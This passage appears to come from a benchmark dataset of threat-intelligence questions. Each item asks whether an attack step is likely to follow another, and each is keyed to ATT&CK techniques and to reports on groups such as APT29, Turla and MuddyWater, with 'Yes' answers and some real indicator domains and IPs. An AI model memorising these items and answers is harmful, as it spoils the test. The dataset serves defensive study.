Defense Evasion: The GroundPeony campaign exhibited defense evasion techniques through the use of DLL side-loading, specifically with the ""version.dll"" file. This file was used to decode and launch shellcode from ""mic.doc"". The decoding process was a two-step procedure involving custom XOR operations. Additionally, the ""mic.doc"" payload had its MZ header removed and was responsible for downloading encoded shellcode, which it would then decode using a similar custom XOR algorithm.
Command and Control: The GroundPeony campaign established command and control (C&C) communication through the use of a C&C server, identified by the domain ""app.onedrivo.com"" with the IP address 172.93.189.239. The ""mic.ver"" config file contained encoded information for connecting to the C&C server, including the IP address and port, which was decoded to facilitate communication.
Others: The GroundPeony threat group, also known as UNC3347, is a China-nexus threat group active since at least 2021, targeting government, research, educational institutes, and telecom sectors in Taiwan, Hong Kong, South Korea, Nepal, and India. The group has been linked to past campaigns exploiting the Follina vulnerability (CVE-2022-30190) and has used infrastructure associated with PublicDomainRegistry, AS63734 (365 Online technology joint stock company), AS55720 (Gigabit Hosting Sdn Bhd), and AS 30823 (combahton GmbH). Indicators of Compromise (IoCs) include various SHA256 hashes and IP addresses/domains such as 103.199.17.184, 160.20.145.111, and *.onedrivo.com.",Yes,GroundPeony_Crawling_with_Malice
1147,244,244-Command and Control-T1001-Data Obfuscation,"After the renamed malicious executable ""mic.exe"" launches and decodes shellcode from ""mic.doc"" using custom XOR operations for defense evasion, is it likely that the GroundPeony campaign will establish command and control (C&C) communication through the consistent decoding of the ""mic.ver"" config file?","Command and Control: The GroundPeony campaign established command and control (C&C) communication through the use of a C&C server, identified by the domain ""app.onedrivo.com"" with the IP address 172.93.189.239. The ""mic.ver"" config file contained encoded information for connecting to the C&C server, including the IP address and port, which was decoded to facilitate communication.","Initial Access: The GroundPeony threat group, also known as UNC3347, has been actively targeting East and South Asian countries since at least 2021. They have been observed exploiting a zero-day vulnerability, Follina (CVE-2022-30190), and compromising target-related websites to distribute malware. The group's recent campaign involved spear-phishing emails with lure documents and URL obfuscation to download and execute malicious payloads from compromised websites, ultimately establishing communication with a C&C server.
Execution: The GroundPeony campaign utilized a malicious executable named "".exe"" or ""Install.exe"" which was copied and renamed to ""mic.exe"" for DLL side-loading. The side-loaded DLL, ""version.dll"", functioned as a shellcode launcher for ""mic.doc"", which is a shellcode downloader known as micDown. The ""mic.ver"" file served as a config file for ""mic.doc"". The attack flow involved executing the renamed executable, loading and decrypting the associated files, and communicating with the C&C server.
Defense Evasion: The GroundPeony campaign exhibited defense evasion techniques through the use of DLL side-loading, specifically with the ""version.dll"" file. This file was used to decode and launch shellcode from ""mic.doc"". The decoding process was a two-step procedure involving custom XOR operations. Additionally, the ""mic.doc"" payload had its MZ header removed and was responsible for downloading encoded shellcode, which it would then decode using a similar custom XOR algorithm.
Others: The GroundPeony threat group, also known as UNC3347, is a China-nexus threat group active since at least 2021, targeting government, research, educational institutes, and telecom sectors in Taiwan, Hong Kong, South Korea, Nepal, and India. The group has been linked to past campaigns exploiting the Follina vulnerability (CVE-2022-30190) and has used infrastructure associated with PublicDomainRegistry, AS63734 (365 Online technology joint stock company), AS55720 (Gigabit Hosting Sdn Bhd), and AS 30823 (combahton GmbH). Indicators of Compromise (IoCs) include various SHA256 hashes and IP addresses/domains such as 103.199.17.184, 160.20.145.111, and *.onedrivo.com.",Yes,GroundPeony_Crawling_with_Malice
1152,245,245-Execution-T1059-Command and Scripting Interpreter,"After achieving initial access by utilizing trojanized installation files of well-known applications like Firefox, VPNpro, DriverPack, and 5kPlayer, is PROMETHIUM likely to execute a PowerShell command to reconfigure Windows Defender and add exclusions for the malware's directories before creating a service for persistence that launches the C2 contact module upon startup?","Execution: The execution of the PROMETHIUM malware involves the use of trojanized installers that deploy the malware alongside legitimate applications. The malware uses a service for persistence and executes a PowerShell command to reconfigure Windows Defender, adding exclusions for the malware's directories and preventing sample submission. The service executable's sole purpose is to launch the C2 contact module upon service startup.","Initial Access: The PROMETHIUM threat actor, active since 2012, has been using trojanized installation files of well-known applications such as Firefox, VPNpro, DriverPack, and 5kPlayer to gain initial access to victims' systems. These trojanized files install both the malware and the legitimate application, which helps to disguise the malicious activities. The group has targeted victims in Colombia, India, Canada, and Vietnam.
Persistence: PROMETHIUM achieves persistence by creating a service that launches the C2 contact module upon service startup. The service name changes from package to package, and the dropped files are stored in a specific Temp folder pattern.
Defense Evasion: To evade detection, the PROMETHIUM malware performs checks for ESET or BitDefender antivirus before dropping the malware. If these antiviruses are installed, the malware will not be dropped. Additionally, the malware adds its directories to the Windows Defender exclusions list using a PowerShell command.
Collection: The malware searches for and exfiltrates Microsoft Office files found on the system. It uses a document search module to parse the hard drive for files with specific extensions, compresses them into an archive, and encodes the archive before sending it to the C2 server.
Command and Control: PROMETHIUM's C2 infrastructure includes around 30 new C2 domains identified by Cisco Talos. The domains are hardcoded into the malware, suggesting the use of a Builder tool to generate the binaries. The C2 servers communicate over HTTPS using self-signed certificates.
Exfiltration: The malware exfiltrates encoded archives containing documents to the C2 server. The archives are encoded using an unusual scheme and split into chunks if larger than a certain size before being sent.
Others: PROMETHIUM has been resilient over the years, continuing its activities despite being exposed multiple times. The group's campaigns have been clustered based on domain creation dates, with some campaigns overlapping and going back to 2018. The threat actor's focus has expanded from Europe and the Middle East to a global operation targeting organizations on most continents. The characteristics of the malware suggest that PROMETHIUM could be part of an enterprise service for hire operation. Cisco Talos provides various ways for customers to detect and block this threat, including Advanced Malware Protection (AMP), Cisco Cloud Web Security (CWS), Email Security, Network Security appliances, AMP Threat Grid, Umbrella, and Snort Subscriber Rule Set.",Yes,Talos Blog __ Cisco Talos Intelligence Group - Comprehensive Threat Intelligence_ PROMETHIUM extends global reach with StrongPity3 APT
1163,246,246-Command and Control-T1104-Multi-Stage Channels,"After delivering malware through spearphishing emails targeting individuals associated with legal disputes against the government of Kazakhstan, is Operation Manul likely to use malware such as JRat and Bandook to execute actions like keylogging and screen capture before leveraging C2 domains like axroot.com and adobeair.net to manage multiple operations simultaneously?","Command and Control: The report mentions that Operation Manul used Command and Control (C2) domains such as axroot.com, kaliex.net, and adobeair.net, among others. These domains were linked to multiple IP addresses and were associated with the operation's malware campaigns. The C2 infrastructure suggests that the attackers managed multiple operations against different targets at the same time.","Initial Access: The CTI report details Operation Manul, which involved spearphishing attempts to deliver malware to targets. The spearphishing emails often contained an invoice or legal document with an attachment that included a blurry image. These emails were sent to journalists, dissidents, their family members, associates, and lawyers involved in litigation with the government of Kazakhstan. The malware used in these attempts was linked to Command and Control servers that hosted web-based control panels for multiple RATs, indicating the operation of several campaigns simultaneously.
Execution: The report identifies two malware families used in Operation Manul: JRat and Bandook. JRat is a cross-platform RAT with functionalities such as keylogging, reverse proxy, password recovery, webcam control, and more. Bandook targets Windows computers and can perform actions like screen capture, webcam recording, audio recording, file manipulation, and spawning a shell. Both RATs are commercially available and have been used to target a variety of systems.
Defense Evasion: The JRat malware contains anti-analysis features, including code obfuscation using Zendix Klass Master (ZKM) and anti-virtualization techniques to detect and shut down if run in a virtualized environment. Bandook also employs evasion techniques, such as process hollowing and checking for virtualized environments before execution.
Others: The report suggests links between Operation Manul and the government of Kazakhstan, as well as potential connections to Arcanum Global Intelligence and an Indian security company called Appin Security Group. The report also notes that the malware campaign is likely carried out on behalf of the government of Kazakhstan against individuals involved in legal disputes with the government. Additionally, the report includes an analysis of the network infrastructure shared between Operation Manul and Operation Hangover, indicating shared servers and domains at the same time.",Yes,i-got-a-letter-from-the-government
1165,247,247-Defense Evasion-T1027-Obfuscated Files or Information,"After using a zero-day exploit embedded in a Word document to infect a target with Plexor malware, is it likely that Longhorn's tools will follow guidelines on tactics to avoid detection before performing system fingerprinting and discovery capabilities with their espionage-focused malware?","Defense Evasion: Longhorn's tools follow the guidelines on tactics to avoid detection as outlined in the Vault 7 documents. They employ practices such as wipe-on-use, in-memory string de-obfuscation, using a unique deployment-time key for string obfuscation, and secure erase protocols involving renaming and overwriting. Longhorn's malware communicates externally at select times, with upload limits on exfiltrated data, and randomization of communication intervals to stay under the radar.","Initial Access: The Longhorn group has been active since at least 2011, utilizing back door Trojans and zero-day vulnerabilities to compromise targets. On one occasion, a computer in the United States was compromised but an uninstaller was launched within hours, indicating an unintentional infection. Longhorn's operations were first noticed by Symantec in 2014 when a zero-day exploit (CVE-2014-4148) embedded in a Word document was used to infect a target with Plexor malware.
Discovery: Longhorn's malware is built for espionage with detailed system fingerprinting, discovery, and exfiltration capabilities. It uses operational security measures to remain undetected.
Collection: Longhorn's malware has an extensive list of commands for remote control and can be customized with additional plugins and modules. It is designed for espionage-type operations with capabilities for detailed system fingerprinting, discovery, and exfiltration.
Command and Control: Longhorn configures a specific domain and IP address combination per target for C&C servers, using privacy services to hide their real identity. The IP addresses are typically owned by legitimate companies offering VPS or web hosting services. The malware communicates with C&C servers over HTTPS using a custom cryptographic protocol to protect communications from identification.
Exfiltration: Longhorn's malware communicates externally at select times, with upload limits on exfiltrated data, and randomization of communication intervals to avoid detection.
Others: Symantec has been protecting its customers from Longhorn's tools for the past three years and has continued to track the group. Longhorn has infiltrated governments and internationally operating organizations, as well as targets in various sectors. Symantec has found evidence of Longhorn activities against 40 targets in 16 countries. The group uses preconfigured malware with target-specific code words and distinct C&C domains and IP addresses. Longhorn operates with a high degree of operational security and appears to work a standard Monday to Friday working week, with indicators suggesting it is from an English-speaking, North American country.",Yes,Longhorn_ Tools used by cyberespionage group linked to Vault 7
1172,248,248-Initial Access-T1190-Exploit Public-Facing Application,"After conducting vulnerability scanning against specific external IP addresses, is it likely that the group will deploy public exploits on identified vulnerable services before using stolen credentials to maintain persistent access in compromised systems?","Initial Access: The group frequently uses publicly available exploits to conduct widespread scanning and exploitation against vulnerable systems, likely in an effort to obtain authentication credentials to allow further access. In recent attacks targeting COVID-19 vaccine research and development, the group conducted basic vulnerability scanning against specific external IP addresses owned by the organizations. The group then deployed public exploits against the vulnerable services identified. The group has been successful using recently published exploits to gain initial footholds. Examples include CVE-2019-19781 Citrix, CVE-2019-11510 Pulse Secure, CVE-2018-13379 FortiGate, and CVE-2019-9670 Zimbra. The group also uses spear-phishing to obtain authentication credentials to internet-accessible login pages for target organizations.","Persistence: Upon gaining access to a system, the group likely drops further tooling and/or seeks to obtain legitimate credentials to the compromised systems in order to maintain persistent access. The actor is likely to use anonymizing services when using the stolen credentials.
Command and Control: In some cases, APT29 also deploys custom malware known as WellMess or WellMail to conduct further operations on the victim's system. WellMess is malware written in either Golang or .NET and has been in use since at least 2018. It is designed to execute arbitrary shell commands, upload and download files, and supports HTTP, TLS, and DNS communications methods. WellMail is a lightweight tool designed to run commands or scripts with the results being sent to a hardcoded Command and Control (C2) server. It uses hard-coded client and certificate authority TLS certificates to communicate with C2 servers.
Others: APT29, also known as 'the Dukes' or 'Cozy Bear', is assessed to be part of the Russian intelligence services by the United Kingdom's National Cyber Security Centre (NCSC) and Canada's Communications Security Establishment (CSE), with agreement from the United States' National Security Agency (NSA) and endorsement from the Department of Homeland Security's Cybersecurity and Infrastructure Security Agency (DHS CISA). The group targets governmental, diplomatic, think-tank, healthcare, and energy targets for intelligence gain. Throughout 2020, APT29 has targeted organizations involved in COVID-19 vaccine development in Canada, the United States, and the United Kingdom, with the intention of stealing information and intellectual property. The group uses custom malware known as 'WellMess' and 'WellMail' to target organizations globally, including those involved with COVID-19 vaccine development. These malware have not previously been publicly associated with APT29. The malware SoreFang, dubbed by the NCSC, is a first stage downloader that uses HTTP to exfiltrate victim information and download second stage malware. It is likely that SoreFang targets SangFor devices. Industry reporting indicates that other actors, including 'DarkHotel', have also targeted SangFor devices. APT29 is likely to continue targeting organizations involved in COVID-19 vaccine research and development.",Yes,Advisory-APT29-targets-COVID-19-vaccine-development
1174,248,248-Persistence-T1078-Valid Accounts,"After using publicly available exploits to conduct scanning and exploitation against vulnerable systems for initial access, is the group likely to obtain legitimate credentials to compromised systems in order to maintain persistent access before deploying custom malware such as WellMess or WellMail for Command and Control operations?","Persistence: Upon gaining access to a system, the group likely drops further tooling and/or seeks to obtain legitimate credentials to the compromised systems in order to maintain persistent access. The actor is likely to use anonymizing services when using the stolen credentials.","Initial Access: The group frequently uses publicly available exploits to conduct widespread scanning and exploitation against vulnerable systems, likely in an effort to obtain authentication credentials to allow further access. In recent attacks targeting COVID-19 vaccine research and development, the group conducted basic vulnerability scanning against specific external IP addresses owned by the organizations. The group then deployed public exploits against the vulnerable services identified. The group has been successful using recently published exploits to gain initial footholds. Examples include CVE-2019-19781 Citrix, CVE-2019-11510 Pulse Secure, CVE-2018-13379 FortiGate, and CVE-2019-9670 Zimbra. The group also uses spear-phishing to obtain authentication credentials to internet-accessible login pages for target organizations.
Command and Control: In some cases, APT29 also deploys custom malware known as WellMess or WellMail to conduct further operations on the victim's system. WellMess is malware written in either Golang or .NET and has been in use since at least 2018. It is designed to execute arbitrary shell commands, upload and download files, and supports HTTP, TLS, and DNS communications methods. WellMail is a lightweight tool designed to run commands or scripts with the results being sent to a hardcoded Command and Control (C2) server. It uses hard-coded client and certificate authority TLS certificates to communicate with C2 servers.
Others: APT29, also known as 'the Dukes' or 'Cozy Bear', is assessed to be part of the Russian intelligence services by the United Kingdom's National Cyber Security Centre (NCSC) and Canada's Communications Security Establishment (CSE), with agreement from the United States' National Security Agency (NSA) and endorsement from the Department of Homeland Security's Cybersecurity and Infrastructure Security Agency (DHS CISA). The group targets governmental, diplomatic, think-tank, healthcare, and energy targets for intelligence gain. Throughout 2020, APT29 has targeted organizations involved in COVID-19 vaccine development in Canada, the United States, and the United Kingdom, with the intention of stealing information and intellectual property. The group uses custom malware known as 'WellMess' and 'WellMail' to target organizations globally, including those involved with COVID-19 vaccine development. These malware have not previously been publicly associated with APT29. The malware SoreFang, dubbed by the NCSC, is a first stage downloader that uses HTTP to exfiltrate victim information and download second stage malware. It is likely that SoreFang targets SangFor devices. Industry reporting indicates that other actors, including 'DarkHotel', have also targeted SangFor devices. APT29 is likely to continue targeting organizations involved in COVID-19 vaccine research and development.",Yes,Advisory-APT29-targets-COVID-19-vaccine-development
1176,249,249-Persistence-T1053-Scheduled Task/Job,"After executing the payload by enabling macros, is it likely that two files, including a VBS script, will be created in randomly named ProgramData directories before the path to the VBS script is added to the task scheduler for persistence?",Persistence: The path to the VBS script is added to the task scheduler as a form of persistence.,"Initial Access: We discovered a new campaign targeting organizations in Turkey, Pakistan, and Tajikistan that has similarities with an earlier campaign named MuddyWater. The campaign uses malicious delivery documents containing text and file names in the Tajik language, attempting to target individuals working for government organizations and telecommunication companies in Tajikistan. Each document uses social engineering to trick potential victims into enabling macros and activating the payload. Some payloads were embedded inside the document, while others were downloaded from the internet after the lure was clicked. There is also a separate lure with a program key generator written in Java that was bundled with a Java downloader. The actual payload is the same in both cases.
Execution: After enabling the macros and the payload executes, two files are created in the ProgramData directory placed in randomly-named directories. The purpose of the .VBS script is to execute the PowerShell script. The path to the VBS script is added to the task scheduler as a form of persistence. In other campaigns, two files are also dropped: a VBS script and a base64 encoded text file, which results in the PowerShell file after decoding. The latest change drops three files: an .sct scriptlet file, an .inf file, and a base64 encoded data file. The scriptlet file and inf file use publicly available code for bypassing AppLocker. The PowerShell script employs several layers of obfuscation and is divided into three parts: global variables like paths and encryption keys, functions related to encryption, and the backdoor function which collects machine information, takes screenshots, and sends this data to a C&C server while waiting for commands.
Defense Evasion: The campaigns use similar obfuscation processes, and the internal variables after deobfuscation. A list of isDebugEnv is also present in both campaigns. The PowerShell script employs several layers of obfuscation. The scriptlet file and inf file use publicly available code for bypassing AppLocker.
Discovery: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Collection: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Command and Control: The communication with the C&C server is done via XML messages with supported ACTION commands: REGISTER, IMAGE, COMMAND, RESULT, and UPLOAD. The backdoor finds out the machine IP address by querying the internet service api[.]ipify[.]org, which returns the IP address of the currently infected machine. This IP address is then fed to another internet service called apinotes[.]com, which returns the location information of the given IP address. The backdoor then collects system information about the infected machine and sends this as part of the REGISTER message. The communication is encrypted using a simple RSA algorithm with very small keys.
Others: The attackers are actively monitoring the incoming connections to the C&C server. In one attempt, an improper request to the C&C server was met with a personalized message: ""Stop!!! I Kill You Researcher."" This indicates that the attackers are monitoring what data is going to and from their C&C server. Another hidden message or a false flag is found in the PowerShell script, with error messages written in simplified Mandarin Chinese displayed if communication with C&C fails and the script is run from a command line. These messages may not reveal anything about the real attackers as malware writers sometimes embed false flags into their programs to confuse researchers.",Yes,MuddyWater_Middle_East_and_Central_Asia
1182,249,249-Execution-T1204-User Execution,"After using social engineering in malicious documents to trick victims into enabling macros for payload activation, is it likely that the campaign will create multiple files, including PowerShell scripts or obfuscated payloads, before achieving persistence by adding script paths to the task scheduler?","Execution: After enabling the macros and the payload executes, two files are created in the ProgramData directory placed in randomly-named directories. The purpose of the .VBS script is to execute the PowerShell script. The path to the VBS script is added to the task scheduler as a form of persistence. In other campaigns, two files are also dropped: a VBS script and a base64 encoded text file, which results in the PowerShell file after decoding. The latest change drops three files: an .sct scriptlet file, an .inf file, and a base64 encoded data file. The scriptlet file and inf file use publicly available code for bypassing AppLocker. The PowerShell script employs several layers of obfuscation and is divided into three parts: global variables like paths and encryption keys, functions related to encryption, and the backdoor function which collects machine information, takes screenshots, and sends this data to a C&C server while waiting for commands.","Initial Access: We discovered a new campaign targeting organizations in Turkey, Pakistan, and Tajikistan that has similarities with an earlier campaign named MuddyWater. The campaign uses malicious delivery documents containing text and file names in the Tajik language, attempting to target individuals working for government organizations and telecommunication companies in Tajikistan. Each document uses social engineering to trick potential victims into enabling macros and activating the payload. Some payloads were embedded inside the document, while others were downloaded from the internet after the lure was clicked. There is also a separate lure with a program key generator written in Java that was bundled with a Java downloader. The actual payload is the same in both cases.
Persistence: The path to the VBS script is added to the task scheduler as a form of persistence.
Defense Evasion: The campaigns use similar obfuscation processes, and the internal variables after deobfuscation. A list of isDebugEnv is also present in both campaigns. The PowerShell script employs several layers of obfuscation. The scriptlet file and inf file use publicly available code for bypassing AppLocker.
Discovery: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Collection: The backdoor function collects machine information and takes screenshots before sending this data to a C&C server.
Command and Control: The communication with the C&C server is done via XML messages with supported ACTION commands: REGISTER, IMAGE, COMMAND, RESULT, and UPLOAD. The backdoor finds out the machine IP address by querying the internet service api[.]ipify[.]org, which returns the IP address of the currently infected machine. This IP address is then fed to another internet service called apinotes[.]com, which returns the location information of the given IP address. The backdoor then collects system information about the infected machine and sends this as part of the REGISTER message. The communication is encrypted using a simple RSA algorithm with very small keys.
Others: The attackers are actively monitoring the incoming connections to the C&C server. In one attempt, an improper request to the C&C server was met with a personalized message: ""Stop!!! I Kill You Researcher."" This indicates that the attackers are monitoring what data is going to and from their C&C server. Another hidden message or a false flag is found in the PowerShell script, with error messages written in simplified Mandarin Chinese displayed if communication with C&C fails and the script is run from a command line. These messages may not reveal anything about the real attackers as malware writers sometimes embed false flags into their programs to confuse researchers.",Yes,MuddyWater_Middle_East_and_Central_Asia
1200,251,251-Reconnaissance-T1592-Gather Victim Host Information,Is it likely that Energetic Bear will perform watering hole attacks targeting individuals associated with Turkish critical infrastructure by compromising websites such as turcas.com.tr before executing SMB credential harvesting by injecting malware into the compromised site?,"Reconnaissance: The CTI report details a campaign by the threat group 'Energetic Bear' involving strategic web compromises for reconnaissance purposes. The group, known for cyber espionage, targeted specific entities such as software suppliers for programmable logic controller (PLC) components used in critical infrastructure. They backdoored these with Havex malware. An example given is the compromise of the Turkish energy company Turcas Petrol's website, turcas.com.tr, which was injected with SMB credential-harvesting malware.","Initial Access: The CTI report describes an initial access technique used by 'Energetic Bear' where a Turkish energy company's website was compromised through a supply chain attack and used in a watering hole attack targeting individuals associated with Turkish critical infrastructure. The site was injected with SMB credential-harvesting malware to facilitate this access.
Credential Access: The CTI report indicates that 'Energetic Bear' used SMB credential-harvesting malware as part of their credential access strategy. This was observed in the compromise of the Turkish energy company's website, where an image URL was modified to redirect to a file protocol, allowing the group to harvest Microsoft SMB credentials.
Others: The CTI report by RiskIQ provides insights into 'Energetic Bear's' broader targeting strategy beyond specific entities. General-purpose websites like plantengineering.com, serving as hubs for critical infrastructure sector information, were also compromised. The attackers had broad access to the server, indicating a definite pattern of targeting news and information websites for the industrial sector. RiskIQ's analysis suggests that the campaign started between the beginning of February and the end of March. The report emphasizes the increasing prevalence of supply-chain attacks and the need for site owners to inventory third-party code on their web assets to prevent becoming pawns in such operations.",Yes,New Insights into Energetic Bear's Attacks on Turkish Critical Infrastructure
1212,252,252-Exfiltration-T1041-Exfiltration Over C2 Channel,Does Turla execute OS-related commands with the PyFlash backdoor to gather information about the victim machine before exfiltrating the output of PyFlash surveillance using the C&C protocol?,Exfiltration: The output of PyFlash surveillance and C&C commands are exfiltrated using the C&C protocol.,"Initial Access: ESET researchers discovered a watering hole operation targeting Armenian websites, using a fake Adobe Flash update lure to deliver malware dubbed NetFlash and PyFlash. The operation is attributed to Turla, an espionage group targeting governmental and military organizations. Compromised websites include armconsul[.]ru, mnp.nkr[.]am, aiisa[.]am, and adgf[.]am, with some belonging to the Armenian government. The campaign involved inserting malicious JavaScript into these websites, such as appending obfuscated code to jquery-migrate.min.js on mnp.nkr[.]am. The malicious code would load external JavaScript from skategirlchina[.]com/wp-includes/data_from_db_top.php, which fingerprints the visitor's browser and potentially delivers a second-stage malicious JavaScript. The campaign ceased delivering malicious scripts by the end of November 2019.
Execution: The watering hole operation by Turla involved a social engineering trick with a fake Adobe Flash update warning to induce users to download and install malware. The fake installer, once executed, would install both a Turla malware variant and a legitimate Adobe Flash program, leading users to believe the update was legitimate.
Persistence: The NetFlash and PyFlash malware variants used by Turla establish persistence using Windows scheduled tasks. NetFlash downloads its second stage malware from a hardcoded URL and sets up a scheduled task for the new backdoor, while PyFlash persists by modifying the Windows task that regularly launches the malware.
Discovery: The PyFlash backdoor executes various OS-related commands such as systeminfo, tasklist, ipconfig, getmac, and arp to gather information about the machine and sends it to the C&C server.
Command and Control: PyFlash communicates with its hardcoded C&C server via HTTP, using AES-128 in CBC mode to encrypt all network communications. NetFlash uses port 80 for communication, while PyFlash uses port 8,000, and another NetFlash sample uses port 15,363.
Others: The Turla group has been active for over ten years, with previous campaigns including Mosquito and LightNeuron. The recent operation shares similarities with past Turla campaigns, particularly one uncovered in 2017. The JavaScript used in the current campaign is almost identical to that of the 2017 campaign, but with different targets and payloads. The operation relies on a well-known social engineering trick and has shifted payloads, likely to evade detection. The new payload, NetFlash, installs a backdoor called PyFlash, developed in Python. ESET will continue monitoring Turla activities and publish relevant information on their blog. Indicators of Compromise (IoCs) include compromised websites and C&C servers such as skategirlchina[.]com and various IP addresses. Samples of the malware with SHA-1 hashes and timestamps are also provided.",Yes,Tracking Turla_ New backdoor delivered via Armenian watering holes _ WeLiveSecurity
1215,253,253-Lateral Movement-T1021-Remote Services,"After using tools like ADFind and port scanning to gather Active Directory and network information as part of the discovery process, is it likely that attackers will use direct shell commands or Cobalt Strike features like psexec, psexec_psh, winrm, and ssh for propagating beacons to other systems within the network to achieve lateral movement?","Lateral Movement: Attackers use direct shell commands or Cobalt Strike's default commands like psexec, psexec_psh, winrm, and ssh for lateral movement. These tools are used to propagate beacons to other systems within the company's network.","Initial Access: The CTI report details the initial compromise and establishment of a foothold using Cobalt Strike's beacon. The beacon, acting as a backdoor, is installed and executed in various forms, either as a stager or stageless. The stager downloads and executes the beacon in memory using protocols like HTTP, HTTPS, and DNS, while the stageless method includes the beacon, resulting in a larger payload size. Cobalt Strike's builder can create payloads in multiple formats, including exe, dll, Service exe, hta, vba macro, PowerShell command, and raw formats. The beacon can communicate with the C&C server using protocols such as HTTP, HTTPS, and DNS, and for internal networks, an SMB beacon is used. Cobalt Strike's 'spawn' feature is used to prevent detection by running beacons in normal processes, and the 'malleable C&C profile' feature allows attackers to modify C&C traffic to bypass network packet-based detection systems.
Privilege Escalation: After the initial compromise, attackers seek to escalate privileges to obtain administrator credentials for lateral movement. Cobalt Strike's Mimikatz feature is used to steal account information, but requires higher privileges than Administrator to run. Attackers utilize UAC bypass or LPE vulnerabilities, sometimes employing third-party tools, to achieve the necessary privilege escalation.
Defense Evasion: Cobalt Strike provides various techniques to bypass detection by security products. It can manipulate packets for network communications, making it difficult to detect HTTP and HTTPS beacon communications. The beacon operates as a process, and Cobalt Strike offers settings to prevent detection of suspicious processes. Additionally, it can bypass memory-based detections by altering the form of the beacon in memory.
Discovery: Attackers use tools like ADFind and port scanning to collect information about the network and connected PCs after gaining escalated privileges. ADFind, a command-line tool, is used to gather Active Directory information, including domain controllers, subnets, computers in the domain, and Active Directory details of the current system.
Others: The report discusses various cases where Cobalt Strike was used in different stages of cyber attacks, including distribution, installation, and lateral movement. It also covers ransomware cases exploiting Cobalt Strike, such as BlueCrab, Hancitor, and cases involving companies A, B, C, D, E, F, G, and H. The report highlights the use of Cobalt Strike in ransomware attacks targeting Korean companies and examines ransomware cases like CLOP, Conti, DarkSide, and Ryuk, detailing how attackers used Cobalt Strike to compromise internal infrastructures and deploy ransomware. The report concludes with recommendations for security managers to protect against Cobalt Strike attacks, emphasizing the importance of monitoring Administrator accounts, disabling unnecessary ports, and keeping software and security products updated.",Yes,ASEC_REPORT_vol.103_ENG
1227,255,255-Initial Access-T1190-Exploit Public-Facing Application,"After conducting a reconnaissance spear phish to gather information about their targets, is it likely that The Inception attackers will exploit CVE-2017-11882 using remote templates in Microsoft Word before deploying the PowerShell backdoor POWERSHOWER for execution activities?","Initial Access: The Inception attackers exploit a year-old Office vulnerability, CVE-2017-11882, to gain initial access to European targets. They use remote templates in Microsoft Word, which allows them to load an external template when the document is opened.","Reconnaissance: The Inception attackers have been active since at least 2014, targeting a variety of industries, primarily in Russia, but also globally. They use a two-stage spear phishing process, initially sending a reconnaissance spear phish to gather information, followed by a second spear phish containing a remote template to deliver a payload.
Execution: The Inception attackers deploy a PowerShell backdoor named POWERSHOWER, which cleans up forensic evidence after itself. It is used to fingerprint the machine, upload information to the C&C, and potentially run a secondary payload.
Persistence: POWERSHOWER sets up persistence by writing itself to %AppData%\Microsoft\Word\log.ps1 and using a run key in the registry.
Defense Evasion: The Inception attackers use anti-forensics techniques during the dropper process to prevent clues from being left on disk or in the registry. They also use a basic backdoor, POWERSHOWER, as a first stage to make it harder for researchers to analyze more sophisticated payloads.
Discovery: POWERSHOWER collects system information on the infected machine and sends it to the C2 server.
Command and Control: POWERSHOWER communicates with a C2 server, sending system information and receiving instructions. It enters a communications loop after a reboot, performing actions based on the status code of a GET request.
Others: Palo Alto Networks' Wildfire detects all current Inception remote template documents and the downloaded CVE-2017-11882 RTFs with malware verdicts. AutoFocus customers can track associated samples with the InceptionRemoteTemplate and PowerShower. Traps blocks all files associated with this campaign. Indicators of Compromise include various remote template documents, PowerShower samples, and IP addresses associated with Inception Remote Template documents.",Yes,Inception Attackers Target Europe with Year-old Office Vulnerability
1230,255,255-Execution-T1059-Command and Scripting Interpreter,"After exploiting the Office vulnerability CVE-2017-11882 to gain initial access via remote templates in Microsoft Word, is it likely that the Inception attackers will deploy the PowerShell backdoor POWERSHOWER before establishing persistence by writing itself to %AppData%\Microsoft\Word\log.ps1 and using a run key in the registry?","Execution: The Inception attackers deploy a PowerShell backdoor named POWERSHOWER, which cleans up forensic evidence after itself. It is used to fingerprint the machine, upload information to the C&C, and potentially run a secondary payload.","Reconnaissance: The Inception attackers have been active since at least 2014, targeting a variety of industries, primarily in Russia, but also globally. They use a two-stage spear phishing process, initially sending a reconnaissance spear phish to gather information, followed by a second spear phish containing a remote template to deliver a payload.
Initial Access: The Inception attackers exploit a year-old Office vulnerability, CVE-2017-11882, to gain initial access to European targets. They use remote templates in Microsoft Word, which allows them to load an external template when the document is opened.
Persistence: POWERSHOWER sets up persistence by writing itself to %AppData%\Microsoft\Word\log.ps1 and using a run key in the registry.
Defense Evasion: The Inception attackers use anti-forensics techniques during the dropper process to prevent clues from being left on disk or in the registry. They also use a basic backdoor, POWERSHOWER, as a first stage to make it harder for researchers to analyze more sophisticated payloads.
Discovery: POWERSHOWER collects system information on the infected machine and sends it to the C2 server.
Command and Control: POWERSHOWER communicates with a C2 server, sending system information and receiving instructions. It enters a communications loop after a reboot, performing actions based on the status code of a GET request.
Others: Palo Alto Networks' Wildfire detects all current Inception remote template documents and the downloaded CVE-2017-11882 RTFs with malware verdicts. AutoFocus customers can track associated samples with the InceptionRemoteTemplate and PowerShower. Traps blocks all files associated with this campaign. Indicators of Compromise include various remote template documents, PowerShower samples, and IP addresses associated with Inception Remote Template documents.",Yes,Inception Attackers Target Europe with Year-old Office Vulnerability
1232,256,256-Initial Access-T1566-Phishing,"After using spear-phishing emails to deliver payloads through exploiting vulnerable Microsoft Office applications, is PKPLUG likely to achieve persistence by employing DLL side-loading before evading defenses by launching malicious payloads via legitimate signed applications?","Initial Access: PKPLUG, a cyber espionage group, has been using spear-phishing emails to deliver payloads to victims, which is a popular tactic for gaining initial access. Some email attachments contained exploits for vulnerable Microsoft Office applications, but this technique was less commonly used compared to social engineering to lure victims into opening attachments.","Persistence: DLL side-loading is almost ubiquitous as a method to install or run payloads for PKPLUG, indicating a persistence mechanism. Additionally, PowerShell and PowerSploit are also being considered for maintaining persistence.
Defense Evasion: PKPLUG employs DLL side-loading to launch malicious payloads via legitimate, signed applications, which is a method of defense evasion. This technique allows the group to avoid detection by security software.
Command and Control: PKPLUG's campaigns have been documented to use various Command and Control (C2) infrastructures, including domain names and IP addresses that are reused across different campaigns. This allows the group to communicate with and control compromised systems.
